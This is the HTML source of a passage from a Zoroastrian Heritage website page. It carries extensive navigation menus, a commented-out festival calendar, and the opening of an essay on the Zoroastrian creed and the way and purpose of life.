		<li><a href="http://www.heritageinstitute.com/zoroastrianism/yazd/page2.htm">Innovative Desert Technologies</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/yazd/zoroastrian.htm">Zoroastrianism in Yazd</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/yazd/schools.htm">Schools. Markerabad. Pioneers</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/pilgrimage.htm">Pilgrimage Sites</a></li>
		</ul>
	</li>

	<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/irandokht_eduljee.pdf">Women Warriors &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/amazons_eduljee.pdf">Amazons</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/irandokht_eduljee.pdf">Irandokht</a></li>
		</ul>
	</li>
	
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/urmia/kandovan_2.htm">Present Cave Dwellings &#187</a>
		<ul>
		<li><a href="urmia/kandovan_2.htm">Kandovan Cave Village Introduction</a></li>
		<li><a href="urmia/kandovan.htm">Kandovan Cave Village Photo Tour</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/kerman/maymand.htm">Maymand - Troglodyte Village</a></li>
		</ul>
	</li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/iranpersia/index.htm">Iran and Persia - The Same?</a></li>
	
	<li><a href="maps/index.htm">MAPS GALLERY</a></li>
	</ul>
</li>


<li><div style="background:#031064; margin-left:-4px; margin-right:-4px"><a href="">&#8226;</a></div>
	<ul style="position: absolute; left: 0px; top: 28px"><li></li>
	</ul>
</li>
<li><a href="http://www.heritageinstitute.com/zoroastrianism/contents_worship.htm">Worship</a>
	<ul style="position: absolute; left: 0px; top: 28px">
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/index.htm">Worship Introduction, Manthra &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/index.htm#praying">Act of Worship - Prayers</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/index.htm#flame">Eternal Flame</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/index.htm#prayer">Prayer and the Manthra</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/index.htm#early">Early Zoroastrian Worship</a></li>
		<li><a href="worship/healingprayer.htm">Healing Prayer</a></li>
		</ul>
	</li>

	<li><a href="worship/healingprayer.htm">Healing Prayer</a></li>
	
	<li><a href="worship/fire.htm">Fire & Light</a>
		<ul>
		<li><a href="worship/fire.htm">Fire & Light</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/index.htm#flame">Eternal Flame</a></li>
		</ul>
	</li>
	
	<li><a href="priests/index.htm">Priesthood & Magi</a></li>
	
	<li><a href="temples/index.htm">Places of Worship &#187</a>
		<ul>
		<li><a href="worship/index.htm#early">Outdoor Worship. Tajikistan</a></li>
		<li><a href="temples/index.htm">Early Fire Houses and Temples</a></li>
		<li><a href="temples/index.htm#ani">Temple Ruins at Ani, Turkey</a></li>
		<li><a href="temples/index.htm#chahartaqi">Chahar-Taqi Design</a></li>
		<li><a href="khorasan/index.htm">Old Temples of Khorasan</a></li>
		<li><a href="temples/index.htm#surakhani">Temple at Surakhani, Azerbaijan</a></li>
		<li><a href="urmia/index.htm#shiz">Azargoshasb Temple Site</a></li>
		<li><a href="temples/atashbahram.htm">Modern Temples: Atash Bahram</a></li>
		<li><a href="temples/agiary.htm">Modern Temples: Agiary, Darbe Mehr</a></li>
		</ul>
	</li>
	
	<li><a href="navjote/index.htm#sudrah_kusti">Sudrah/Sudre and Kusti/Kushti</a></li>
	
	<li><a href="ceremonies/sace.htm">Sace / Ses Ceremonial Tray</a></li>
	
	<li><a href="ceremonies/liturgy.htm">Liturgical Ceremonies</a></li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/pilgrimage.htm">Pilgrimage Sites in Yazd &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/pilgrimage.htm">Yazd Pilgrimage Sites</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/piresabz.htm">Pir-e Sabz / Chak-Chak</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/setinaraki.htm#setipir">Seti Pir</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/setinaraki.htm#naraki">Pir-e Naraki</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/banunarestaneh.htm#pirebanu">Pir-e Banu</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/banunarestaneh.htm#pirenarestaneh">Pir-e Narestaneh</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/herishtabarkuh.htm#pireherisht">Pir-e Herisht</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/herishtabarkuh.htm#abarkuh">Cypress at Abarkuh / Abarqu</a></li>
		</ul>
	</li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/udvada.htm">Pilgrimage Site - Udvada</a></li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/FaroharMotif-Eduljee.pdf">Icons & Symbols &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/FaroharMotif-Eduljee.pdf">Farohar/Fravahar Motif (pdf)</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/FaroharMotif-Eduljee-Abridged.pdf">Farohar/Fravahar Motif - Abridged (pdf)</a></li>
		</ul>
	</li>

	</ul>
</li>


<li><div style="background:#031064; margin-left:-4px; margin-right:-4px"><a href="">&#8226;</a></div>
	<ul style="position: absolute; left: 0px; top: 28px"><li></li>
	</ul>
</li>
<li><a href="contents_scriptures.htm">Scriptures. Language</a>
	<ul style="position: absolute; left: 0px; top: 28px">
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/scriptures/index.htm">Avesta Texts</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/scriptures/history.htm">Avesta Compilation & Destruction</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/scriptures/selections.htm">Scripture Selections</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/vendidad_eduljee.pdf">Vendidad&#8211;Sadeh & Pahlavi</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/pdf/Schwartz.pdf">Gatha Composition by M. Schwartz (pdf)</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/scriptures/manuscripts.htm">Manuscripts</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/languages/index.htm">Avestan, Iranian, Persian Languages</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/languages/oldPersian.htm">Old Persian Discovery</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/languages/aramaic.htm">Aramaic</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/pdf/avestanKaranjia.pdf">Learn Avestan by Karanjia (pdf)</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/pdf/dari.pdf">Dari by Farudi, Toosarvand (pdf)</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/languages/index.htm#avestancalligraphy">Avestan Calligraphy video</a></li>
	</ul>
</li>


<li><div style="background:#031064; margin-left:-4px; margin-right:-4px"><a href="">&#8226;</a></div>
	<ul style="position: absolute; left: 0px; top: 28px"><li></li>
	</ul>
</li>
<li><a href="contents_ceremonies.htm">Ceremonies</a>
	<ul style="position: absolute; left: 0px; top: 28px">
	<li><a href="ceremonies/liturgy.htm">Liturgical Ceremonies</a></li>
	<li><a href="purification/index.htm">Cleansing & Purification Ceremonies</a></li>
	<li><a href="ceremonies/sace.htm">Sace / Ses Ceremonial Tray</a></li>
	<li><a href="navjote/index.htm">Navjote, Sudreh Pooshi. Initiation</a></li>
	<li><a href="navjote/index.htm#sudrah_kusti">Sudrah/Sudre and Kusti/Kushti</a></li>
	<li><a href="jashan/index.htm">Jashan / Jashne - Thanksgiving Ceremonies</a></li>
	<li><a href="marriage/index.htm">Marriage &#187</a>
		<ul><li><a href="marriage/index.htm">Overview, Customs, Divorce</a></li>
		<li><a href="marriage/indian/index.htm">Indian Weddings</a></li>
		<li><a href="marriage/iranian/index.htm">Yazdi Iranian Weddings</a></li>
		<li><a href="marriage/iranian/page2.htm">Modern Iranian Weddings</a></li>
		</ul>
	</li>
	
	<li><a href="death/index.htm">Funeral Customs &#187</a>
		<ul>
		<li><a href="death/index.htm">Fate of the Soul. Eschatology</a></li>
		<li><a href="death/page2.htm">Death Ceremonies</a></li>
		<li><a href="death/page3.htm">Methods. Towers of Silence</a></li>
		<li><a href="death/ossuary.htm">Ossuaries</a></li>
		</ul>
	</li>
	</ul>
</li>


<li><div style="background:#031064; margin-left:-4px; margin-right:-4px"><a href="">&#8226;</a></div>
	<ul style="position: absolute; left: 0px; top: 28px"><li></li>
	</ul>
</li>
<li><a href="contents_festivals.htm">Festivals. Calendar</a>
	<ul style="position: absolute; left: 0px; top: 28px">
	<li><a href="nowruz/index.htm">New Year - Nowruz &#187</a>
		<ul>
		<li><a href="nowruz/index.htm">Overview</a></li>
		<li><a href="nowruz/nowruz2.htm">Pre-Nowruz Festivities</a></li>
		<li><a href="nowruz/nowruz3.htm">Nowruz Day Table & Customs</a></li>
		</ul>
	</li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/khayyam/index.htm">Fire of Spring - Omar Khayyam</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/pateti/index.htm">New Year's Eve - Pateti</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/gahambar/index.htm">Gahambar / Gahanbar</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/worship/fire.htm#sadeh">Jashne Sadeh @ Fire & Light</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#t">Jashne Tirgan @ Grid</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#y">Jashne Yalda @ Grid</a></li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/yalda_mithra_dec25_detailed_eduljee2016.pdf">Yalda, Christmas & Mithra &#187</a>
		<ul>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/december_25_yalda_eduljee.pdf">Article</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/yalda_mithra_dec25_detailed_eduljee2016.pdf">Monograph-Detailed</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/reference/yalda_mithra_dec25_abridged_eduljee2016.pdf">Monograph-Abridged</a></li>
		</ul>
	</li>
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#calendar">Annual Festivals Calendar</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/calendar/index.htm">Calendar &#187</a>
		<ul><li><a href="http://www.heritageinstitute.com/zoroastrianism/calendar/index.htm">Overview & Organization</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm">365-Day Calendar Grid</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page3.htm">Monthly Calendar Grids</a></li>
		<li><a href="http://www.heritageinstitute.com/zoroastrianism/pdf/pithavala.pdf">Pithavala's Zoroastrian Year (pdf)</a></li>
		</ul>
	</li>
	</ul>
</li>


<li><div style="background:#031064; margin-left:-4px; margin-right:-4px"><a href="">&#8226;</a></div>
	<ul style="position: absolute; left: 0px; top: 28px"><li></li>
	</ul>
</li>
<li><a href="contents_reference.htm">References</a>
	<ul style="position: absolute; left: 0px; top: 28px">
	
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/">Articles & Monographs &#187</a>
		<ul>
		<li><a href="reference/amazons_eduljee.pdf">Amazons</a></li>
		<li><a href="reference/december_25_yalda_eduljee.pdf">Yalda & Christmas</a></li>
		<li><a href="reference/farohar_motif_eduljee.pdf">Farohar Motif-Complete</a></li>
		<li><a href="reference/farohar_motif_eduljee_abridged.pdf">Farohar Motif-Abridged</a></li>
		<li><a href="reference/int_winter_festivals_eduljee.pdf">Winter Festivals</a></li>			
		<li><a href="reference/irandokht_eduljee.pdf">Irandokht</a></li>		
		<li><a href="reference/madame_cama_abridged_eduljee.pdf">Madame Cama-Abridged</a></li>		
		<li><a href="reference/madame_cama_complete_eduljee.pdf">Madame Cama-Complete</a></li>		
		<li><a href="reference/nutrition_eduljee_abridged.pdf">Nutrition-Abridged</a></li>							
		<li><a href="reference/nutrition_eduljee_complete.pdf">Nutrition-Complete</a></li>		
		<li><a href="reference/vendidad_eduljee.pdf">Vendidad</a></li>		
		<li><a href="reference/yalda_mithra_dec25_abridged_eduljee2016.pdf">Yalda Christmas Mithra-Abridged</a></li>
		<li><a href="reference/yalda_mithra_dec25_detailed_eduljee2016.pdf">Yalda Christmas Mithra-Complete</a></li>
		</ul>
	</li>

	<li><a target="_blank" href="maps/index.htm">Map Gallery</a></li>
	<li><a href="reference/ages.htm">Historic Ages. Categories of Time</a></li>

	<li><a href="reference/strabo.htm">Strabo</a></li>
	<li><a href="reference/herodotus_histories1.htm">Herodotus &#187</a>
		<ul>
		<li><a href="reference/herodotus_histories1.htm">Herodotus' Histories</a></li>
		<li><a href="reference/herodotus.htm">Herodotus on Persians</a></li>
		<li><a href="reference/herodotus_scythia.htm">Herodotus on Scythians</a></li>
		</ul>
	</li>
	
	<li><a href="reference/xenophon/anabasis/anabasis1.htm">Xenophon &#187</a>
		<ul>
		<li><a href="reference/xenophon/anabasis/anabasis1.htm">Xenophon' Anabasis</a></li>
		<li><a href="reference/xenophon/cyropaedia/cyropaedia1.htm">Xenophon' Cyropaedia</a></li>
		</ul>
	</li>
	
	<li><a href="reference/ptolemy/index.htm">Ptolemy Bk. 6</a></li>
	
	<li><a href="reference/isidorus.htm">Parthian Stations by Isidorus</a></li>
	
	<li><a href="reference/aeschylus.htm">The Persians by Aeschylus</a></li>
	
	<li><a href="pdf/JacksonPersiaPastPresent.pdf">Jackson - Persia Past Present (pdf)</a></li>	
	<li><a target="_blank" href="pdf/markham_history_of_persia.pdf">Markham's History of Persia (pdf)</a></li>
	<li><a target="_blank" href="pdf/Story_of_Media__Babylon_Persia_Ragozin.pdf">Ragozin: Media Babylon Persia</a></li>
	<li><a target="_blank" href="rawlinson/index.htm">Rawlinson: 7 Great Monarchies</a></li>
	
	<li><a href="pdf/Sykes_History_of_persia1.pdf">Sykes' History of Persia &#187</a>
		<ul>
		<li><a href="pdf/Sykes_History_of_persia1.pdf">Sykes' History of Persia Vol 1 (pdf)</a></li>
		<li><a href="pdf/Sykes_History_of_persia2.pdf">Sykes' History of Persia Vol 2 (pdf)</a></li>
		</ul>
	</li>
	
	<li><a href="westernauthors/index.htm">Western Authors & Zoroastrianism &#187</a>
		<ul>
		<li><a href="westernauthors/index.htm">Post Classical Western Authors</a></li>
		<li><a href="aryans/western.htm">Western Views on Aryans</a></li>
		<li><a href="reference/darmesteter1.htm">Darmesteter: Introduction</a></li>
		<li><a href="goethe/index.htm">Goethe: Parsi Nameh</a></li>
		<li><a href="pdf/helengerth.pdf">Gerth: Zoroastrians & Internet (pdf)</a></li>
		<li><a href="pdf/martin_haug_essays.pdf">Haug: Zoroastrianism (pdf) &#187</a>
			<ul>
			<li><a href="pdf/martin_haug_essays.pdf">Essays: History,Grammar,Avesta (pdf)</a></li>
			<li><a href="pdf/martin_haug_lecture.pdf">Lecture: Yasna 45 (pdf)</a></li>
			</ul>
		</li>	
		<li><a href="pdf/JacksonPersiaPastPresent.pdf">Jackson: Persia Past Present (pdf)</a></li>	
		</ul>
	</li>
	
	<li><a href="westernauthors/nietzsche.htm">Friedrich Nietzsche & Zoroastrianism &#187</a>
		<ul>
		<li><a href="westernauthors/nietzsche.htm">Thus Spake Zarathustra Intro</a></li>
		<li><a href="westernauthors/nietzschezarathushtraInt.htm">Thus Spake Zarathustra (text)</a></li>
		<li><a href="westernauthors/nietzscheVideo.htm">Thus Spake Zarathustra videos</a></li>
		</ul>
	</li>
	
	<li><a target="_blank" href="links/index.htm">Links</a></li>
	</ul>
</li>


<li><div style="background:#031064; margin-left:-4px; margin-right:-4px"><a href="">&#8226;</a></div>
	<ul style="position: absolute; left: 0px; top: 28px"><li></li>
	</ul>
</li>
<li><a href="http://www.heritageinstitute.com/zoroastrianism/contents_healing.htm">Ancient Healing</a>
	<ul style="position: absolute; left: 0px; top: 28px">
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/healing/index.htm">Wellness & Healing Concepts</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/barsom/index.htm">Baresman (Barsom)</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/haoma/index.htm">Haoma (Hom)</a></li>
	<li><a href="worship/healingprayer.htm">Healing Prayer</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/pdf/usefulPlantsOfIranIraq.pdf">Useful Plants of Iran (pdf)</a></li>
	<li><a href="http://www.heritageinstitute.com/zoroastrianism/garden/index.htm">Persian Gardens</a></li>
	</ul>
</li>

<li><div style="background:#031064; margin-left:-4px; margin-right:-4px"><a href="">&#8226;</a></div>
	<ul style="position: absolute; left: 0px; top: 28px"><li></li>
	</ul>
</li>
<li><a href="shahnameh/index.htm">Shahnameh&nbsp;</a>
	<ul style="position: absolute; left: 0px; top: 28px">
	<li><a href="shahnameh/index.htm">Ferdowsi & His Work</a></li>
	<li><a href="shahnameh/manuscripts.htm">Shahnameh Manuscripts</a></li>
	<li><a href="shahnameh/characters.htm">Shahnameh's Characters</a></li>
	<li><a href="shahnameh/heros.htm">The Heroes - Story in Brief</a></li>
	<li><a href="shahnameh/page01.htm">Shahnameh in English</a></li>
	</ul>
</li>

</ul>

<h1 style="text-align:center; font-size:16pt; color:#CFF8FC; margin-bottom:0px">
<span style="letter-spacing: 1pt">Zoroastrian Heritage</span></h1>
<h1 style="text-align:center; color:#CFF8FC; font-variant: normal; font-size:11pt; margin-top:-2px">Author: K. E. Eduljee</h1>

</div>

<!--webbot bot="Include" i-checksum="39765" endspan --></td></tr></table>
</div>
</td></tr>

<tr><td width="100%" id="banner_cell_sh"><img src="images/banners/indexShort.jpg" alt="Farohar motif at Persepolis" title="Farohar (fravahar) motif at Persepolis">
<p class="credit" style="text-align: center">Image above is from a rock incription at Persepolis, ancient capital of the Persian <a href="http://www.heritageinstitute.com/zoroastrianism/achaemenian/page2.htm#achaemenes_1">Achaemenian</a> kings. The motif called the <a href="http://www.heritageinstitute.com/zoroastrianism/overview/index.htm#farohar">farohar or fravahar</a> is now widely adopted as a symbol of Zoroastrianism. Click words in red for further descriptions</p></td></tr>

<tr><td><div align="center">
<table width="1360"><tr>
<td class="col_left">

<!-- search box -->
<div style="float:right">
<!--webbot bot="Include" U-Include="included_content/search_box_index.shtml" TAG="BODY" startspan -->

<!-- search box -->
<form method="get" action="http://www.google.com/search" style="text-align: right; margin-right:0px">
<div class="text" style="width:15em" align="right">
<table border="0" cellpadding="0">
<tr><td align="right"><h2>Search Our Site:</h2></td></tr>
<tr><td align="right">
<input type="text"   name="q" size="25"
 maxlength="255" value="">
<input type="submit" value="Google Search"></td></tr>
<tr><td align="right" style="font-size:75%">
<input type="hidden"  name="sitesearch"
 value="http://www.heritageinstitute.com/zoroastrianism/" checked><br>
</td></tr></table>
</div>
</form>

<!--webbot bot="Include" i-checksum="7692" endspan --></div>
<!-- end search box -->

<!--
<h2 style="clear:both">Upcoming Special Days</h2>

<div class="text" style="background-color:#CFF8FC; border:2px solid white; padding:5px;">
<p style="margin-left: 0"> 
(Also see <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm">Calendar grid</a>)<br>
Jan 16: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#bahmangan">Bahmangan</a><br>
Jan 24: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#sk">Jashne Sadeh, Kermani-Zarthushti</a><br>
Jan 30: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#s">Jashne Sadeh, Iran-National (modern)</a><br>
Feb 18: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#sp">Esfandgan</a><br>
Feb 14-Mar 15 - Last month<br>Aspandmard (Esfand)<br>Time for <a href="http://www.heritageinstitute.com/zoroastrianism/nowruz/index.htm">Nowruz</a> prep &<br><a href="http://www.heritageinstitute.com/zoroastrianism/nowruz/nowruz2.htm#khaneh_tekani">Khaneh-Tekani, Spring-Cleaning</a><br>
Mar 11-20: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#muktad">Farvardigan/<br>Muktad</a> (Also see <a href="http://www.heritageinstitute.com/zoroastrianism/nowruz/nowruz2.htm#farvardigan">Nowruz pg: Farvardigan / Muktad</a>)<br>
Mar 16-20: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#maidyarem">Hamas-path-maidyem Gahanbar / Gahambar</a> & Panjeh, year's last five days. (Also see <a href="http://www.heritageinstitute.com/zoroastrianism/nowruz/nowruz2.htm#hamaspathmaedem">Nowruz pg</a> & 
<a href="http://www.heritageinstitute.com/zoroastrianism/gahambar/index.htm">Gahanbar / Gahambar pg</a>)</p>
</p>
</div><br>


<p> <font color="#9900CC">
<b>Nowruz Khojasteh Baad!</b><br>
Sol-e Now Khojasteh Baad!<br>
Nowruz Piruz!<br>
Happy New Year!</font>
</p><br>

<table class="image_center">
<tr><td><img src="images/garden/bouquet.jpg" alt="bouquet" title="bouquet" width="200" height="200"></td></tr>
<tr><td class="caption"></td></tr>
</table>

<p style="margin-left: 0">
<a href="http://www.heritageinstitute.com/zoroastrianism/khayyam/index.htm">&#187 Fire of Spring - Verses from Omar Khayyam</a></p><br>

Mar 21: <a href="http://www.heritageinstitute.com/zoroastrianism/nowruz/index.htm">Nowruz / New Year's day</a><br>
Mar 26: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#khordad">Khordad Sal</a><br>Celebration of Zarathushtra's birth<br>
Apr 2: <a href="http://www.heritageinstitute.com/zoroastrianism/nowruz/nowruz3.htm#sizdeh_bedar">Sizdah-Bedar</a><br>('out-of-doors on the thirteenth' day after Nowruz)<br>
Apr 8: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#farvardigan">Farvardigan</a><br>
Apr 22: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#ardibehesthgan">Ardibehestgan</a><br>
Apr 30-May 4: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#maidyozarem">Maidyozarem Gahanbar/Gahambar.<br>(Also see <a target="_blank" href="http://www.heritageinstitute.com/zoroastrianism/gahambar/index.htm">Gahanbar/Gahambar pg.)</a><br>
May 25: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#khordadgan">Khordadgan</a><br>
Jun 29-Jul 3: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#maidyoshem">Maidyoshem Gahanbar/Gahambar<br>(Also see <a target="_blank" href="http://www.heritageinstitute.com/zoroastrianism/gahambar/index.htm">Gahanbar/Gahambar pg.)</a><br>
Jul 1: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#tirgan">Tirgan</a><br>

<p style="margin-left: -5px">
<b>Pateti & Nowroz Khojasteh Baad!</b><br>
</p>
<table class="image_center">
<tr><td><img src="images/garden/bouquet1.jpg" alt="bouquet" title="bouquet" width="200" height="200"></td></tr>
<tr><td class="caption"></td></tr>
</table>

Jul 9-18: Kadimi (Kadmi/Qadimi) Farvardigan<br>
Jul 14-18: Kadimi (Kadmi/Qadimi) Panji<br>
Jul 19: Kadimi (Kadmi/Qadimi) Nowruz<br>
Jul 24: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#amordadgan">Amordadgan</a> & Kadimi Khordad Sal<br>
Aug 8-17: <a href="http://www.heritageinstitute.com/zoroastrianism/pateti/index.htm#muktad">Shenshai (Shahenshahi) Muktad</a><br>
Aug 13-17: <a href="http://www.heritageinstitute.com/zoroastrianism/pateti/index.htm#muktad">Shenshai Gatha days</a><br>
Aug 17: <a href="http://www.heritageinstitute.com/zoroastrianism/pateti/index.htm">Shenshai Pateti</a>.
Year's last & Vahishtoishti Gatha day<br>
Aug 18: <a href="http://www.heritageinstitute.com/zoroastrianism/pateti/index.htm">Shenshai Nowroz</a><br>
Also see <a href="http://www.heritageinstitute.com/zoroastrianism/pateti/index.htm">Pateti</a></a> page<br>
Aug 21: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#shahrivargan">Shahrivargan</a><br>
Aug 23: Shenshai Khordad Sal<br>
Sep 12-16: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#paitishem">Paitishem Gahanbar/ Gahambar</a>. Also see <a target="_blank" href="http://www.heritageinstitute.com/zoroastrianism/gahambar/index.htm">Gahanbar page</a><br>
Oct 2: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#mehergan">Mehergan</a><br>
Oct 12-16: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#ayathrem">Ayathrem Gahanbar/ Gahambar</a>. Also see <a target="_blank" href="http://www.heritageinstitute.com/zoroastrianism/gahambar/index.htm">Gahanbar page</a><br>
Oct 26: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#abangan">Abangan</a><br>
Nov 24: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#azargan">Azargan</a><br>
Nov 24: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#azargan">Azargan</a><br>
Dec 11: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#sadehyazd">Jashne Sadeh, Yazdi-Zarthushti</a><br>(100 days to <a href="http://www.heritageinstitute.com/zoroastrianism/nowruz/index.htm">Nowruz</a>, Mar. 21)<br>
Dec 16: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#daegan">Daegan. Winter's 1st month starts</a><br>
Dec 21: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#yalda">Jashne Yalda</a><br>
Dec 23: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#daeganadar">Daegan Adar</a><br>
Dec 26: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#diso">Zarathushtra's Death<br>Anniversary. Zarthosht-no-Diso</a><br>
Dec 30: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#daeganmeher">Daegan Meher</a><br>
Dec 31-Jan 4: <a href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#g5">Maidyarem Gahanbar/Gahambar</a><br>(See <a href="http://www.heritageinstitute.com/zoroastrianism/gahambar/index.htm">Gahanbar/Gahambar pg.)</a><br>
Jan 7: <a target="_blank" href="http://www.heritageinstitute.com/zoroastrianism/calendar/page2.htm#daegandin">Daegan Din</a><br>

-->

</td>

<td class="col_center">
<a name="top"></a>
<h1>Zoroastrian Creed</h1>
<p class="text" style="margin-left:0px"><a target="_blank" href="http://www.heritageinstitute.com/zoroastrianism/scriptures/selections.htm">Vendidad</a></p>
<p class="text" style=" text-align:center">
"On three noble ideals be ever intent:<br>
The good thought well thought,<br>
The good word well spoken,<br>
The good deed well done."<br>
</p>
<br><br>

<h1>Zoroastrian Way, Purpose and Goal of Life</h1>
<h2>Way of Life</h2>
<p class="text" style="margin-left:0px"><a target="_blank" href="overview/index.htm#Amesha_Spentas">Amesha Spentas</a></p>
<p class="text" style="margin-left:0px">Eternal Enlightenment - Ageless Wisdom</p>
<p class="text" style="text-align: justify">
&#8226;	The way of life suggested by Zoroastrianism is based on achieving six ideals:<br>
&nbsp; &#8229;	a <b>good mind</b>: a positive attitude and gaining wisdom<br>
&nbsp; &#8229;	<b>principled living</b>: honesty, honest work, helpfulness, moderation and balance<br>
&nbsp; &#8229;	<b>independence</b>: self-reliance and leadership<br>
&nbsp; &#8229;	<b>serenity</b> and happiness<br>
&nbsp; &#8229;	<b>wholeness</b>: healthy and holistic living<br>
&nbsp; &#8229;	an <b>undying spirit</b>.<br>

&#8226;	Included in the ideal of independence is autonomy: not being beholden to anyone, not being a slave to any dogma, and having the sovereignty to make free and independent decisions - all within the self-elected bounds of ethical values, goodness, and not causing harm to others. The ideal of self-reliance is balanced with helping the less fortunate maintain their independence and dignity.<br>
&#8226;	This way of life gives effect and meaning to the creed: to commit to a life based on good thoughts, good words and good deeds.<br>
&#8226;	The effectiveness of a person's beliefs is demonstrated in one's deeds. While praying helps to reaffirm beliefs, a life based on good deeds is prayer in action. Our lives are the temples of our souls.<br>
In short:<br>
&#8226;	Zoroastrianism lights the path towards an active, meaningful life grounded in wisdom, goodness and wellness.
</p>
<br><br>

<a name="purpose"></a>
<h2>Purpose of Life</h2>
<p class="text" style="margin-left:0px"><a target="_blank" href="overview/index.htm#dichotomy">Living as an Ashavan</a></p>
<p class="text" style="margin-left:0px">Goodness in Action</p>
<p class="text" style="text-align: justify">
The purpose of life is to work towards achieving the best existence we can envision. Working to achieve the best existence includes striving to achieve individual excellence and excellence for all; working tirelessly and diligently to help build a world free from want, fear, and evil; preserving and <a href="http://www.heritageinstitute.com/zoroastrianism/overview/simplified.htm#environment">protecting the environment</a>. 
</p>
<br><br>

<a name="goal"></a>
<h2>Goal in Life</h2>
<p class="text" style="margin-left:0px"><a target="_blank" href="overview/index.htm#ushta">Ushta & Armaiti</a></p>
